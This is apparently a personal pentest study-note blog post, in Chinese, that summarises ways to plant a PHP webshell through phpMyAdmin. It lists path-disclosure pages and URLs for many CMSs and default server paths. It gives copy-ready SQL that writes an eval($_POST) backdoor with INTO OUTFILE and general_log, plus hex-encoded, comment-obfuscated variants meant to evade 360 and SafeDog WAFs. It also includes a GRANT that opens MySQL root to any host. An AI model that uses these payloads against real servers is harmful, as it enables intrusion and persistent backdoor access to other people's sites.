---
title: 学习总结篇—GetShell
date: 2019-8-28 00:30:16
author: dylan
top: false
cover: false
summary: 学习总结篇—GetShell
password: 9f77c4517ffa5375fb7f06c0209facae53fd5e4b7b88986eb0c11591810b2dbe
categories: summary
tags: 
    - GetShell
    - summary
---
# 0x00 前言

各种GetShell总结

# 0x01 文件上传


[upload-labs文件上传漏洞练习](https://dylan903.coding.me/2019/08/04/upload-labs-wen-jian-shang-chuan-lou-dong-lian-xi/)


# 0x02 phpMyAdmin GetShell
## 网站路径信息获取

找网站的安装路径，其实就是通过“配置页面”或者“配置文件”找到Document Root 指向的网站路径位置，
而Document Root最常见的地方就是 phpinfo.php页面和httpd.conf配置文件中；

### phpinfo获取网站路径
#### 收集网站部署使用的套件信息

常见未删除phpinfo页面

* phpinfo.php
* info.php
* 1.php
* test.php

常见未删除探针页面

* l.php
* p.php
* tanzhen.php
* tz.php
* u.php

常见未删除测试文件

* test.php
* ceshi.php
* info.php
* phpinfo.php
* php_info.php
* 1.php


#### 爬行遍历收集

通过web扫描器，进行爬虫爬行遍历网站的所有链接，
收集可能存在的phpinfo类似的页面，收集网站物理路径信息。

#### 爆破扫描收集

通过web扫描器，进行爬虫爬行遍历网站的所有链接，
收集可能存在的phpinfo类似的页面，收集网站物理路径信息。


### Google语法爆路径

结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。
注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。

```
Site:xxx.edu.tw warning
Site:xxx.com.tw “fatal error”
```



### 配置文件读取网站路径

关键字：**web套件配置文件默认路径**

 `load_file()`函数读取配置文件
**读取配置文件httpd.conf 或vhosts.conf！！！**

通过常用的web容器套件，来获取默认的网站可写路径信息，
如常用套件：xampp、phpnow、phpstudy等。

#### 利用场景
在通过web套件已经猜解到网站的默认路径后，经常会遇到向套件默认目录写入一句话后，无法成功的情况。

* 情况一：
一句话写入成功，但是此目录并不是渗透对象的网站根目录，
我们无法通过URL地址访问到“我们写入的一句话木马”；

* 情况二：
还有一种情况，就是对于套件默认路径，我们没有写入的权限。
最常见的案例就是，我们渗透的网站服务器的系统是linux主机，而没有写入权限。


* 情况三：
再有一种情况就是，目标站点有相应的安全防护如杀毒软件、安全狗、或者IPS、WAF一类的应用防护，
导致无法成功写入一句话。对于这种有应用防护的原理，基本一致，都是基于特征检测的方式进行安全防护，
如单一特征、多特征防护。那么绕过这些安全防护的方法就是使用变种，如对提交内容进行编码混淆或者采用非敏感的函数等，
关于木马绕过技术不在文中扩展说明。

对于以上“情况一”与“情况二”不能写入成功问题的解决思路，需要满足以下两个条件即可完美解决。

**找到可写的网站路径**
**且可写路径为渗透站点的物理路径，能够被正常的URL访问解析`**

而对于要满足以上的条件，最好的办法，就是通过读取web套件中间件的配置文件信息，获取网站的真实物理路径（如：httpd.conf）。
如在获知目标站点使用的xampp套件的情况，下我们可以直接利用phpmyadmin有root登录权限的条件下，
直接读取默认配置文件httpd.conf，通过配置文件httpd.conf收集到网站的真实物理路径，
读取方法：

`select load_file('D:/xampp/apache/conf/httpd.conf');`


查看数据库目录
`Select @@basedir` 
或者 
`select @@basedir`


#### Xampp套件

网站默认路径：
`$disk:/xampp/htdocs`

其他可写入路径：
`$disk:/xampp/phpmyadmin/`
**注：xampp套件phpmyadmin目录如果没删除，也可以尝试直接写入操作；**


猜测默认apache默认配置文件路径，读取配置文件，查找网站根目录和可写目录路径；
Apache配置文件默认路径：

httpd.conf配置文件：`$disk:/xampp/apache/conf/httpd.conf`
vhosts.conf虚拟主机：`$disk:/xampp/apache/conf/extra/httpd-vhosts.conf`


#### LAMPP套件

网站默认路径：
`/opt/lampp/htdocs`

Apache配置文件默认路径：
httpd.conf配置文件：`/opt/lampp/etc/httpd.conf`
vhosts.conf虚拟主机：`/opt/lampp/etc/extra/httpd-vhosts.conf`


#### phpStudy套件

网站默认路径:

`$disk:/phpstudy/www`

Apache配置文件默认路径：

httpd.conf配置文件：`$disk:/phpStudy/Apache/conf/httpd.conf`
vhosts.conf虚拟主机：`$disk:/phpStudy/Apache/conf/extra/httpd-vhosts.conf`


####  phpnow套件

phpnow套件默认网站路径依据版本不同可能不同，
当前使用最新的版本是1.5.6，其默认目录：

`$disk:\phpnow-1.5.6\htdocs`


Apache配置文件默认路径：

httpd.conf配置文件：`$disk:\PHPnow-1.5.6\Apache-20\conf\httpd.conf`
vhosts.conf虚拟主机：`$disk:\PHPnow-1.5.6\Apache-20\conf\extra\vhosts.comf`


#### LNMP套件

网站默认路径：

`/home/wwwroot/default`


#### 其他Web容器



IIS6.0+win2003 配置文件
网站默认路径：`$disk:\InetPub\wwwroot`
配置文件默认路径：`C:/Windows/system32/inetsrv/metabase.xml`

IIS7.0+WINDOWS配置文件
网站默认路径：`$disk:\InetPub\wwwroot`
配置文件默认路径：`C:\Windows\System32\inetsrv\config\applicationHost.config`

Linux:

配置文件:
`/etc/php.ini php`
`/etc/httpd/conf.d/php.conf`
配置文件:
`/etc/httpd/conf/httpd.conf Apache`
`/usr/local/apache/conf/httpd.conf`
`/usr/local/apache2/conf/httpd.conf`
虚拟目录配置文件:
`/usr/local/apache/conf/extra/httpd-vhosts.conf`

### 错误页面爆网站路径

特定目录报错！！！

#### Phpmyadmin暴路径

一般在获取phpmyadmin管理页面后，特定的版本访问特点的目录，可以爆出网站的物理路径。

1. `/phpmyadmin/libraries/lect_lang.lib.php`
2. `/phpMyAdmin/index.php?lang[]=1`
3. `/phpMyAdmin/phpinfo.php`
4. `/phpmyadmin/themes/darkblue_orange/layout.inc.php`
5. `/phpmyadmin/libraries/select_lang.lib.php`
6. `/phpmyadmin/libraries/lect_lang.lib.php`
7. `/phpmyadmin/libraries/mcrypt.lib.php`

#### SQL注入点暴路径

对于存在sql注入点的页面，可以尝试“加单引号”或者“构造错误参数”进行网站路径爆错显示。

`www.xxx.com/news.php?id=149′`
`www.xxx.com/researcharchive.php?id=-1`


#### nginx文件类型错误解析爆路径

当我们遇到Web服务器是nginx，且存在文件类型解析漏洞时，可以在图片地址后加`/x.php`，
该图片不但会被当作`php`文件执行，还有可能爆出物理路径。

`www.xyz.com/123.jpg/x.php`



#### DeDeCms

```
/member/templets/menulit.php
/plus/paycenter/alipay/return_url.php
/plus/paycenter/cbpayment/autoreceive.php
/paycenter/nps/config_pay_nps.php
/plus/task/dede-maketimehtml.php
/plus/task/dede-optimize-table.php
/plus/task/dede-upcache.php
```

#### WordPress

```
/wp-admin/includes/file.php
/wp-content/themes/baiaogu-seo/footer.php
```

#### Ecshop商城系统暴路径漏洞文件

```
/api/cron.php
/wap/goods.php
/temp/compiled/ur_here.lbi.php
/temp/compiled/pages.lbi.php
/temp/compiled/user_transaction.dwt.php
/temp/compiled/history.lbi.php
/temp/compiled/page_footer.lbi.php
/temp/compiled/goods.dwt.php
/temp/compiled/user_clips.dwt.php
/temp/compiled/goods_article.lbi.php
/temp/compiled/comments_list.lbi.php
/temp/compiled/recommend_promotion.lbi.php
/temp/compiled/search.dwt.php
/temp/compiled/category_tree.lbi.php
/temp/compiled/user_passport.dwt.php
/temp/compiled/promotion_info.lbi.php
/temp/compiled/user_menu.lbi.php
/temp/compiled/message.dwt.php
/temp/compiled/admin/pagefooter.htm.php
/temp/compiled/admin/page.htm.php
/temp/compiled/admin/start.htm.php
/temp/compiled/admin/goods_search.htm.php
/temp/compiled/admin/index.htm.php
/temp/compiled/admin/order_list.htm.php
/temp/compiled/admin/menu.htm.php
/temp/compiled/admin/login.htm.php
/temp/compiled/admin/message.htm.php
/temp/compiled/admin/goods_list.htm.php
/temp/compiled/admin/pageheader.htm.php
/temp/compiled/admin/top.htm.php
/temp/compiled/top10.lbi.php
/temp/compiled/member_info.lbi.php
/temp/compiled/bought_goods.lbi.php
/temp/compiled/goods_related.lbi.php
/temp/compiled/page_header.lbi.php
/temp/compiled/goods_script.html.php
/temp/compiled/index.dwt.php
/temp/compiled/goods_fittings.lbi.php
/temp/compiled/myship.dwt.php
/temp/compiled/brands.lbi.php
/temp/compiled/help.lbi.php
/temp/compiled/goods_gallery.lbi.php
/temp/compiled/comments.lbi.php
/temp/compiled/myship.lbi.php
/includes/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php
/includes/modules/cron/auto_manage.php
/includes/modules/cron/ipdel.php
```

#### Ucenter爆路径

`/ucenter/control/admin/db.php`

#### DZbbs

`/manyou/admincp.php?my_suffix=%0A%0DTOBY57`

#### Z-blog

`/admin/FCKeditor/editor/dialog/fck%5Fspellerpages/spellerpages/server%2Dscripts/spellchecker.php`

#### Php168爆路径

````
/admin/inc/hack/count.php?job=list
/admin/inc/hack/search.php?job=getcode
/admin/inc/ajax/bencandy.php?job=do
/cache/MysqlTime.txt
````

PHPcms2008-sp4
注册用户登陆后访问
`/phpcms/corpandresize/process.php?pic=../images/logo.gif`

#### CMSeasy爆网站路径漏洞

漏洞出现在menu_top.php这个文件中

```
/lib/mods/celive/menu_top.php
/lib/default/ballot_act.php
/lib/default/special_act.php
```

## 写入shell方法
### 写入条件
**导出WebShell主要条件：**

* Root数据库用户（root权限）
* 网站绝对路径（确定有写入权限）
* magic_quotes_gpc：Off（关闭）

**导出WebShell其它条件：**

* magic_quotes_gpc：开启时，会对'单引号进行转义，使其变成“\”反斜杠。
* secure_file_priv：此配置项用来完成对数据导入导出的限制，如允许导入导出到指定目录。
* file_priv：file_priv权限允许你用load_file、into outfile读和写服务器上的文件，任何被授予这个权限的用户都能读和写服务器的任何文件。

**写入权限**
查看能否自定义导出文件目录的权限

`SHOW VARIABLES LIKE "secure_file_priv";`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/1541693041317.png)

如果值为文件夹目录，则只允许修改目录下的文件，如果值为`NULL`则为禁止。
并且这个值是只读变量，只能通过配置文件修改。


```
show global variables like "%secure%";      //查询secure_file_priv配置
secure_file_prive=null              //不允许导入导出数据到目录
secure_file_priv=c:\90sec            //允许导入导出数据到指定目录
secure_file_priv=''              //允许导入导出数据到任意目录
secure_file_priv="/"              //允许导入导出数据到任意目录
```
注：
在`my.ini`、`my.cnf`、`mysqld.cnf`文件中找到`secure_file_prive`
并将其值设置为`""`或`"/"`，重启MySQL服务！

### 常规方法

**创建数据表导出shell**

```
CREATE TABLE `mysql`.`shadow9` (`content` TEXT NOT NULL );
INSERT INTO `mysql`.`shadow9` (`content` ) VALUES ('<?php @eval($_POST[pass]);?>');
SELECT `content` FROM `shadow9` INTO OUTFILE 'C:\\phpStudy\\WWW\\90sec.php';
DROP TABLE IF EXISTS `shadow9`;
```

 **一句话导出shell**

```
select '<?php @eval($_POST[pass]);?>' into outfile 'c:/phpstudy/www/90sec.php';  
select '<?php @eval($_POST[pass]);?>' into outfile 'c:\\phpstudy\\www\\90sec.php';
select '<?php @eval($_POST[pass]);?>' into dumpfile 'c:\\phpstudy\\www\\bypass.php';
```

**日志备份获取shell**

```
show global variables like "%genera%";          //查询general_log配置
set global general_log='on';              //开启general log模式
SET global general_log_file='D:/phpStudy/WWW/cmd.php';    //设置日志文件保存路径
SELECT '<?php phpinfo();?>';              //phpinfo()写入日志文件
set global general_log='off';              //关闭general_log模式
```

### 绕过写入
当有WAF拦截的时候 我们可以尝试外链 这样提交的数据包不被WAF拦截
`grant all privileges on *.* to 'root'@'%' identified by 'root' with grant option;     //开启MySQL外链`
`flush privileges;                      //刷新MySQL系统权限相关表`

这里的这些技巧是从别人那边收集过来的 感谢！！！
绕过360 （通过内联注释）
`select '<?php @eval($_POST[pass]);?>' into /*!50001outfile*/ 'c:/phpstudy/www/bypass.php';`

绕过网站安全狗<4.0 （通过hex编码）
```
select 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
```

绕过安全狗4.0 通过hex编码+内联注释
```
/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
```

### 绕过写入
绕过server_sql.php、tbl_sql.php、db_sql.php + 安全狗导出WebShell
以上的三个文件的作用是（执行SQL语句）
但是如果被删除了可以通过以下的方法

* token需要
* 自己选择一个数据库和数据表
* 参数pos=0


```
&sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
```


例如

```
http://127.0.0.1/phpmyadmin/sql.php?db=数据库名&token=token值&table=数据表名&pos=0&sql_query=/*!50001select*/ 0x3c3f7068702024613d636f6e766572745f75756465636f646528222638372d5339372954206022293b40246128245f504f53545b27212a21275d293b3f3e into outfile 'C:\\phpStudy\\WWW\\bypass.php';
```


# 0x03 CMS GetShell
## WordPress

[Wordpress 后台GetShell总结](https://dylan903.coding.me/2019/11/06/wordpress-hou-tai-getshell-zong-jie/)

# 参考文章

[PhpMyAdmin 网站路径信息获取](https://bbs.ichunqiu.com/thread-19893-1-1.html)
[总结下写phpmyadmin写shell的方法](https://blog.csdn.net/q1352483315/article/details/88904001)
[phpmyadmin getshell姿势 - 先知社区](https://xz.aliyun.com/t/3283)